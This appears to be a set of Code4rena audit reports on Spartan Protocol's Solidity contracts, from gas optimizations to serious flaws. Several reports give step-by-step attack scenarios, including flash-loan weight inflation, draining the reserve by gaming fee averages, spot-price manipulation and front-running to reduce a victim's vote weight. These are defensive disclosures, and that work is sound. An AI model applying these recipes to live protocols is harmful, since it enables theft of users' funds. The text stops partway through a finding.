# Handle  gpersoon   # Vulnerability details  ## Impact Sometimes the reference to function calls, that are done via the DAO, are looked up multiple times in one function call. For example mintSynth calls:  ​ -   _DAO() 4x -   _DAO().UTILS() 3x  This can be done more efficient by caching the result of _DAO() and _DAO().UTILS()  f## Proof of Concept // https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L229 ​function mintSynth(address synthOut, address member) external returns(uint outputAmount, uint fee) {        ​require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synthOut) == true, "!synth"); // Must be a valid Synth      ​..        ​uint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, tokenAmount); // Calculate value of swapping SPARTA to the relevant underlying TOKEN        ​uint _liquidityUnits = iUTILS(_DAO().UTILS()).calcLiquidityUnitsAsym(_actualInputBase, address(this)); // Calculate LP tokens to be minted       ​..        ​uint _fee = iUTILS(_DAO().UTILS()).calcSwapFee(_actualInputBase, baseAmount, tokenAmount); // Calc slip fee in TOKEN        ​fee = iUTILS(_DAO().UTILS()).calcSpotValueInBase(TOKEN, _fee); // Convert TOKEN fee to SPARTA        ​  function _DAO() internal view returns(iDAO) {        ​return iBASE(BASE).DAO();    ​}  //https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L624 ​function UTILS() public view returns(iUTILS){        ​if(daoHasMoved){            ​return Dao(DAO).UTILS();        ​} else {            ​return _UTILS;        ​}    ​}  ## Tools Used  ## Recommended Mitigation Step Cache _DAO() and cache the sub functions like: _DAO().UTILS()) If called multiple times from function  
# Handle  shw   # Vulnerability details  ## Impact  The `getPoolShareWeight` function returns a user's pool share weight by calculating how many SPARTAN the user's LP tokens account for. However, this approach is vulnerable to flash loan manipulation since an attacker can swap a large number of TOKEN to SPARTAN to increase the number of SPARTAN in the pool, thus effectively increasing his pool share weight.  ## Proof of Concept  According to the implementation of `getPoolShareWeight,` a user's pool share weight is calculated by `uints * baseAmount / totalSupply`, where `uints` is the number of user's LP tokens, `totalSupply` is the total supply of LP tokens, and `baseAmount` is the number of SPARTAN in the pool. Thus, a user's pool share weight is proportional to the number of SPARTAN in the pool. Consider the following attack scenario:  1. Supposing the attacked pool is SPARTAN-WBNB. The attacker first prepares some LP tokens (WBNB-SPP) by adding liquidity to the pool. 2. The attacker then swaps a large number of WBNB to SPARTAN, which increases the pool's `baseAmount`. He could split his trade into small amounts to reduce slip-based fees. 3. The attacker now wants to increase his weight in the `DaoVault`. He adds his LP tokens to the pool by calling the `deposit` function of `Dao.` 4. `Dao` then calls `depositLP` of `DaoVault`, causing the attacker's weight to be recalculated. Due to the large proportion of SPARTAN in the pool, the attacker's weight is artificially increased. 5. With a higher member weight, the attacker can, for example, vote the current proposal with more votes than he should have or obtain more rewards when calling `harvest` of the `Dao` contract. 6. The attacker then swaps back SPARTAN to WBNB and only loses the slip-based fees.  Referenced code: [Utils.sol#L46-L50](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L46-L50) [Utils.sol#L70-L77](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L70-L77) [DaoVault.sol#L44-L56](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/DaoVault.sol#L44-L56) [Dao.sol#L201](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L201) [Dao.sol#L570](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L570)  ## Recommended Mitigation Steps  A possible mitigation is to record the current timestamp when a user's weight in the `DaoVault` or `BondVault` is recalculated and force the new weight to take effect only after a certain period, e.g., a block time. This would prevent the attacker from launching the attack since there is typically no guarantee that he could arbitrage the WBNB back in the next block.  
# Handle  shw   # Vulnerability details  ## Impact  The `claimAllForMember` function of `Dao` is permissionless, allowing anyone to claim the unlocked bonded LP tokens for any member. However, claiming a member's LP tokens could decrease the member's weight in the `BondVault`, thus affecting the member's votes and rewards in the `Dao` contract.   ## Proof of Concept  For example, an attacker can intentionally front-run a victim's `voteProposal` call to decrease the victim's vote weight to prevent the proposal from being finalized:  1. Supposing the victim's member weight in the `BondVault` is 201, the total weight is 300. The victim has some LP tokens claimable from the vault, and if claimed, the victim's weight will be decreased to 101. To simplify the situation, assuming that the victim's weight in the `DaoVault` and the total weight of the `DaoVault` are both 0. 2. The victim wants to vote on the current proposal, which requires the majority consensus. If the victim calls `voteProposal`, the proposal will be finalized since the victim has the majority weight (201/300 > 66.6%). 3. An attacker does not want the proposal to be finalized, so he calls `claimAllForMember` with the victim as the parameter to intentionally decrease the victim's weight. 4. As a result, the victim's weight is decreased to 101, and the total weight is decreased to 200. The victim cannot finalize the proposal since he has no majority anymore (101/200 < 66.6%).  Similarly, an attacker can front-run a victim's `harvest` call to intentionally decrease the victim's reward since the amount of reward is calculated based on the victim's current weight.  Referenced code: [Dao.sol#L179-L206](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L179-L206) [Dao.sol#L276-L285](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L276-L285) [Dao.sol#L369-L383](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L369-L383) [Dao.sol#L568-L574](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L568-L574) [Dao.sol#L577-L586](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L577-L586) [BondVault.sol#L104-L117](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/BondVault.sol#L104-L117) [BondVault.sol#L120-L129](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/BondVault.sol#L120-L129) [BondVault.sol#L155-L162](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/BondVault.sol#L155-L162)  ## Recommended Mitigation Steps  Consider removing the `member` parameter in the `claimAllForMember` function and replace all `member` to `msg.sender` to allow only the user himself to claim unlocked bonded LP tokens.  
# Handle  shw   # Vulnerability details  ## Impact  Several functions in `Utils` do not handle edge cases where the divisor is 0, caused mainly by no liquidity in the pool. In such cases, the transactions revert without returning a proper error message.  ## Proof of Concept  Referenced code: [Utils.sol#L75](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L75) [Utils.sol#L90](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L90) [Utils.sol#L109-L110](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L109-L110) [Utils.sol#L123-L124](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L123-L124) [Utils.sol#L131](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L131) [Utils.sol#L138](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L138) [Utils.sol#L155](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L155) [Utils.sol#L189](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L189) [Utils.sol#L195](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L195) [Utils.sol#L215](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L215)  ## Recommended Mitigation Steps  Check if the divisors are 0 in the above functions to handle edge cases.  
# Handle  0xsanson   # Vulnerability details  ## Impact In Router.sol, the function addLiquidityForMember() doesn't check inputBase and inputToken. Since we know they can't both be zero (it wouldn't change anything and user pays the gas for nothing).  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Router.sol#L51  ## Tools Used editor  ## Recommended Mitigation Steps Consider adding a require `inputBase>0 || inputToken>0`.  
# Handle  0xsanson   # Vulnerability details  ## Impact In Router.sol, there's a loss of precision that can be corrected by shifting the operations.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Router.sol#L274  ## Tools Used editor  ## Recommended Mitigation Steps Consider rewriting L274-275 with `uint numerator = (_fees * reserve) / eraLength / maxTrades;`.  
# Handle  0xsanson   # Vulnerability details  ## Impact zapLiquidity() in Router.sol misses an input validation unitsInput > 0.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Router.sol#L59  ## Tools Used editor  ## Recommended Mitigation Steps Add an input validation for unitsInput.  
# Handle  JMukesh   # Vulnerability details  ## Impact https://docs.soliditylang.org/en/v0.8.6/contracts.html#constant-and-immutable-state-variables  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L11  ## Tools Used  manual review  ## Recommended Mitigation Steps   
# Handle  JMukesh   # Vulnerability details  ## Impact  https://docs.soliditylang.org/en/v0.8.6/contracts.html#constant-and-immutable-state-variables  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L15  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L14  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L18  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L7 https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L12  ## Tools Used  manual review  ## Recommended Mitigation Steps  
# Handle  0xsanson   # Vulnerability details  ## Impact In Synth.sol, the function burnSynth() calculates a division between two variables. Since they can be zero, it's better to have a require with a clear error message when the division is not possible, otherwise an user wouldn't know why a transaction reverted.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Synth.sol#L176  ## Tools Used editor  ## Recommended Mitigation Steps Add a require(denom != 0, "LPDebt = 0").  
# Handle  0xsanson   # Vulnerability details  ## Impact In synthFactory.sol, there's an `event CreateSynth(address indexed token, address indexed pool)`. However the event is emitted with "synth" as second output.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/synthFactory.sol#L13 https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/synthFactory.sol#L46  ## Tools Used editor  ## Recommended Mitigation Steps Think about what's the better variable to be emitted, and correct one of the lines.  
# Handle  heiho1   # Vulnerability details  ## Impact  Pool.burnSynth(address,address) is potentially a reentrant method because it executes transfers and burning before updating balances/metrics.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L245  ## Tools Used  Slither  ## Recommended Mitigation Steps  The function should update state before external calls.  Consider using a nonReentrant guard as provided by OpenZeppelin:  https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard  
# Handle  cmichel   # Vulnerability details  The `Router.addDividend` function tells the reserve to send dividends to the pool depending on the fees.  - The attacker provides LP to a curated pool. Ideally, they become a large LP holder to capture most of the profit, they should choose the smallest liquidity pool as the dividends are pool-independent. - The `normalAverageFee` variable that determines the pool dividends can be set to zero by the attacker by trading a single wei in the pool `arrayFeeSize` (20) times (use `buyTo`). The fees of the single wei trades will be zero and thus the `normalAverageFee` will also be zero as, see `addTradeFee`. - The attacker then does a trade that generates some non-zero fees, setting the `normalAverageFee` to this trade's fee. The `feeDividend` is then computed as `_fees * dailyAllocation / (_fees + normalAverageFee) = _fees * dailyAllocation / (2 * _fees) = dailyAllocation / 2`. Half of the `dailyAllocation` is sent to the pool. - The attacker repeats the above steps until the reserve is almost empty. Each time the `dailyAllocation` gets smaller but it's still possible to withdraw almost all of it. - They redeem their LP tokens and gain a share of the profits  ## Impact The reserve can be emptied by the attacker.  ## Recommended Mitigation Steps Counting only the last 20 trades as a baseline for the dividends does not work. It should probably average over a timespan but even that can be gamed if it is too short. I think a better idea is to compute the dividends based on **volume** traded over a timespan instead of looking at individual trades.   
# Handle  cmichel   # Vulnerability details  ## Vulnerability Details  The `SynthVault.withdraw` function does not claim the user's rewards. It decreases the user's weight and therefore they are forfeiting their accumulated rewards. The `synthReward` variable in `_processWithdraw` is also never used - it was probably intended that this variable captures the claimed rewards.  ## Impact Usually, withdrawal functions claim rewards first but this one does not. A user that withdraws loses all their accumulated rewards.  ## Recommended Mitigation Steps Claim the rewards with the user's deposited balance first in `withdraw`.   
# Handle  cmichel   # Vulnerability details  ## Vulnerability Details  The `SynthVault.harvestSingle` function can be used to mint & deposit synths without using a lockup. An attacker sends `BASE` tokens to the pool and then calls `harvestSingle`. The inner `iPOOL(_poolOUT).mintSynth(synth, address(this));` call will mint synth tokens to the vault based on the total `BASE` balance sent to the pool, including the attacker's previous transfer. They are then credited the entire amount to their `weight`.  This essentially acts as a (mint +) deposit without a lock-up period.  ## Recommended Mitigation Steps Sync the pool before sending `BASE` to it through `iRESERVE(_DAO().RESERVE()).grantFunds(reward, _poolOUT);` such that any previous `BASE` transfer is wasted. This way only the actual reward's weight is increased.  
# Handle  cmichel   # Vulnerability details  ## Vulnerability Details  The `SynthVault._deposit` function adds `weight` for the user that depends on the spot value of the deposit synth amount in `BASE`. This spot price can be manipulated and the cost of manipulation is relative to the pool's liquidity. However, the reward (see `calcReward`) is measured in BASE tokens unrelated to the pool. Therefore, if the pool's liquidity is low and the reward reserve is high, the attack can be profitable:  1. Manipulate the pool spot price of the `iSYNTH(_synth).LayerONE()` pool by dripping a lot of `BASE` into it repeatedly (sending lots of smaller trades is less costly due to the [path-independence of the continuous liquidity model](https://docs.thorchain.org/thorchain-finance/continuous-liquidity-pools)). This increases the `BASE` per `token` price. 2. Call `SynthVault.depositForMember` and deposit a _small_ amount of synth token. The `iUTILS(_DAO().UTILS()).calcSpotValueInBase(iSYNTH(_synth).LayerONE(), _amount)` will return an inflated weight due to the price. 3. Optionally drip more `BASE` into the pool and repeat the deposits 4. Drip back `token` to the pool to rebalance it  The user's `weight` is now inflated compared to the deposited / locked-up amount and they can claim a large share of the rewards.  ## Impact The cost of the attack depends on the pool's liquidity and the profit depends on the reserve. It could therefore be profitable under certain circumstances.  ## Recommended Mitigation Steps Track a TWAP price of the synth instead, store the deposited synths instead, and compute the weight & total weight on the fly based on the TWAP * deposit amount instead of at the time of deposit.  
# Handle  cmichel   # Vulnerability details  ## Vulnerability Details The `Synth._transfer` function does not check if `recipient != 0`. Unlike standard ERC20, tokens can be accidentally burned this way.  ## Recommended Mitigation Steps Prevent user errors by denying transfers to the zero address and forcing them to call `burn` instead.  
# Handle  cmichel   # Vulnerability details  ## Vulnerability Details  The protocol differentiates between public pool creations and private ones (starting without liquidity). However, this is not effective as anyone can just flashloan the required initial pool liquidity, call `PoolFactory.createPoolADD`, receive the LP tokens in `addForMember` and withdraw liquidity again.  ## Recommended Mitigation Steps Consider burning some initial LP tokens or taking a pool creation fee instead.   
# Handle  maplesyrup   # Vulnerability details  ## Impact Gas optimizations Does not affect the contract in any harmful way. Suggestions allow for smart contract gas optimizations.  ## Proof of Concept According to Slither analyzer documentation (https://github.com/crytic/slither/wiki/Detector-Documentation#state-variables-that-could-be-declared-constant), the variable in contract Utils.sol called "one" or Utils.one can be set to a constant as it is considered a variable that does not change throughout the contract.   Slither Detectors:  constable-states:  Utils.one (contracts/Utils.sol, lines#11) should be constant  ------------  Code in contract:  uint public one = 10**18; <---- can be constant as it does not change  --------------  Console output (via Slither in JSON format):    "constable-states": [     "Utils.one (contracts/Utils.sol#11) should be constant\n"   ],  ## Tools Used  Spartan Contracts Solidity (v 0.8.3) Slither Analyzer (v 0.8.0)  ## Recommended Mitigation Steps  1. Clone repository for Spartan Smart Contracts 2. Create a python virtual environment with a stable python version 3. Install Slither Analyzer on the python VEM 4. Run Slither against all contracts  
# Handle  maplesyrup   # Vulnerability details  ## Impact  Gas Optimization This does not directly impact the smart contract in anyway besides cost. This is a gas optimization to reduce cost of smart contract.  ## Proof of Concept According to Slither Analyzer documentation (https://github.com/crytic/slither/wiki/Detector-Documentation#public-function-that-could-be-declared-external), there are functions in the contract that are never called. These functions should be declared as external in order to save gas.   Slither Detector:  external-function:  purgeDeployer() should be declared external:  BondVault.purgeDeployer() (contracts/BondVault.sol, lines#50-52)  -----------------------  Console output (via Slither in JSON format):  "external-function": [     "purgeDeployer() should be declared external:\n\t- BondVault.purgeDeployer() (contracts/BondVault.sol#50-52)\n",     "hasMinority(uint256) should be declared external:\n\t- Dao.hasMinority(uint256) (contracts/Dao.sol#601-610)\n",     "ROUTER() should be declared external:\n\t- Dao.ROUTER() (contracts/Dao.sol#615-621)\n",     "UTILS() should be declared external:\n\t- Dao.UTILS() (contracts/Dao.sol#624-630)\n",     "BONDVAULT() should be declared external:\n\t- Dao.BONDVAULT() (contracts/Dao.sol#633-639)\n",     "DAOVAULT() should be declared external:\n\t- Dao.DAOVAULT() (contracts/Dao.sol#642-648)\n",     "POOLFACTORY() should be declared external:\n\t- Dao.POOLFACTORY() (contracts/Dao.sol#651-657)\n",     "SYNTHFACTORY() should be declared external:\n\t- Dao.SYNTHFACTORY() (contracts/Dao.sol#660-666)\n",     "RESERVE() should be declared external:\n\t- Dao.RESERVE() (contracts/Dao.sol#669-675)\n",     "SYNTHVAULT() should be declared external:\n\t- Dao.SYNTHVAULT() (contracts/Dao.sol#678-684)\n",     "greet() should be declared external:\n\t- Greeter.greet() (contracts/Greeter.sol#15-17)\n",     "setGreeting(string) should be declared external:\n\t- Greeter.setGreeting(string) (contracts/Greeter.sol#19-22)\n"   ]  ## Tools Used  Spartan Contracts Solidity (v 0.8.3) Slither Analyzer (v 0.8.0)  ## Recommended Mitigation Steps  1. Clone repository for Spartan Smart Contracts 2. Create a python virtual environment with a stable python version 3. Install Slither Analyzer on the python VEM 4. Run Slither against all contracts  
# Handle  0xRajeev   # Vulnerability details  ## Impact  addCuratedPool() is missing a require(isCuratedPool[_pool] == false) check, similar to the one in removeCuratedPool to ensure that the DAO is not trying to curate an already curated pool which indicates a mismatch of assumption/accounting compared to the contract state.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L79-L87  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L93   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Add require(isCuratedPool[_pool] == false) before setting isCuratedPool[_pool] = true.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  The token argument used in CreatePool event emit of createPoolADD() should really be _token so that WBNB address is logged in the event instead of zero address when token == 0. Logging a zero address could confuse off-chain user interfaces because it is treated as a burn address by convention.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L60  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L49   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Use _token instead of token in event emit.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  When a member calls removeLiquiditySingle() requesting only SPARTA in return, i.e. toBASE = true, the LP tokens are transferred to the Pool to withdraw the constituent SPARTA and TOKENs back to the Router. The withdrawn TOKENs are then transferred back to the Pool to convert to SPARTA and directly transferred to the member from the Pool. However, the member’s SPARTA are left behind in the Router instead of being returned along with converted SPARTA from the Pool.   In other words, the _member's BASE SPARTA tokens that were removed from the Pool along with the TOKENs are never sent back to the _member because the _token's transferred to the Pool are converted to SPARTA and only those are sent back to member directly from the Pool via swapTo().   This effectively results in member losing the SPARTA component of their Pool LP tokens which get left behind in the Router and are possibly claimed by future transactions that remove SPARTA from Router.  ## Proof of Concept  LPs sent to Pool: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L121  SPARTA and TOKENs withdrawn from Pool to Router: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L122  TOKENs from Router sent to Pool: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L126  TOKENs in Pool converted to BASE SPARTA and sent to member directly from the Pool: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L127   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  1. BASE SPARTA should also be transferred to the Pool before swapTo() so they get sent to the member along with the converted TOKENs via swapTo() 2. Use swap(BASE) instead of swapTo() so that TOKENs are swapped for BASE SPARTA in Pool and sent back to ROUTER. Then send all the SPARTA from ROUTER to member.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  The _handleTransferIn() functions use a conditional check (_amount > 0) to execute the transfer-in logic of tokens. This should really be a require() to prevent zero amount transfers into the protocol which will allow subsequent logic to execute and potentially utilize any dust/stuck funds from earlier to be accounted to the sender.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L198-L210  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L202-L206  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L110-L114  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Change condition check to a require() which will revert any transfers of zero tokens/funds.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  This isListedPool check implemented by isPool() is missing in many functions of the contract that accept pool/token addresses from users. getPool() returns the default mapping value of 0 for token that do not have valid pools. This lack of input validation may lead to use of zero/invalid pool addresses in the protocol context and reverts in the best case or burn/loss of user funds in the worst case.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L119-L133  Use of getPool() without isPool() check: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/BondVault.sol#L108  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L52  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L81  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L139  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L155  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L175  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L232  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L247-L248  Several usages of getPool() in Utils.sol and other places.  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Combine isPool() isListedPool check to getPool() so that it always returns a valid/listed pool in the protocol.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  The threshold check for basisPoints while a required part of input validation is an unnecessary redundant check because calcPart() does a similar upper bound check and the lower bound check on 0 is only an optimization.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L95  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L65   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Remove redundant check to save gas and improve readability/maintainability.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  _token is conditionally set (to WBNB) but never used in addLiquiditySingleForMember() function unlike its usage in other functions. Such usage typically indicates missing/incorrect functionality. It looks like _handleTransferIn checks token == 0 again to consider BNB.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L83  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Recommend re-evaluating _token usage in this function, adding any missing logic or removing it for readability/maintainability.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  zapLiquidity() used to trade LP tokens of one pool to another is missing a check for toPool != fromPool which may happen accidentally. The check will prevent unnecessary transfers and avoid any fees/slippage or accounting errors.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L58-L71   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Add toPool != fromPool as part of input validation.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  An attacker can front-run any operation that depends on the pool contract's internal balance amounts being unsynced to pool's balance on token/base contracts effectively nullifying the transfer of base/tokens for those operations. This will make _getAddedBaseAmount() and _getAddedTokenAmount() return 0 (because the balances are synced) from such operations.   Impact: The affected operations are: addForMember(), swapTo() and mintSynth() which will all take the user funds to respective contracts but will treat it as 0 (because of the syncing) and thus not add liquidity, return swapped tokens or mint any synths to the affected users. User loses deposited funds to the contract.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L308-L312  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L261-L270  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L272-L281  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L216-L220  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L231  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L174-L175  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L279  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Add access control to sync() function so that only Router can call it via addDividend().  
# Handle  0xRajeev   # Vulnerability details  ## Impact  Incorrect event parameter outputAmount is used (instead of output) in the MintSynth event emit. outputAmount is a named return variable that is never set in this function and so will always be 0. This should instead be output. This will confuse the UI or offchain monitoring tools that 0 synths were minted and will lead to users panicking/complaining or trying to mint synth again.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L240  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L229  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L232  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Replace outputAmount with output in the emit.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  If moveDAO() is executed after voting, the existing DAO contract continues to function as before whereas it should ideally cease to function/exist from the users’ perspective or at least function as a clone of the new DAO by using the same addresses as it does.  Scenario: moveDAO is executed to make DAO and BASE.DAO point to the new address. Existing DAO contract continues to function but all the other interfacing contracts (ROUTER, UTILS, DAOVAULT, BONDVAULT, SYNTHVAULT, POOLFACTORY, SYNTHFACTORY and RESERVE) use the updated DAO address as updated in BASE. At a minimum, this leads to undefined behavior and at worst an attack where the old DAOs (there could be many) are exploited because it still points to valid router, pool and vault contracts.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L451-L459   changeDAO: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/outside-scope/Sparta.sol#L189-L193   Use of BASE.DAO: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/BondVault.sol#L54-L57  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/DaoVault.sol#L32-L34  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L39-L41  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L41-L43  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L20-L22  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L20-L22  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L29-L31  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L35-L37  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthFactory.sol#L27-L29  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L45-L47  Updated Getters: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L614-L684  Example uses of stale interface contract addresses _* instead of using Dao(DAO).* versions: _ROUTER: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L259  _BONDVAULT: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L281  _UTILS: 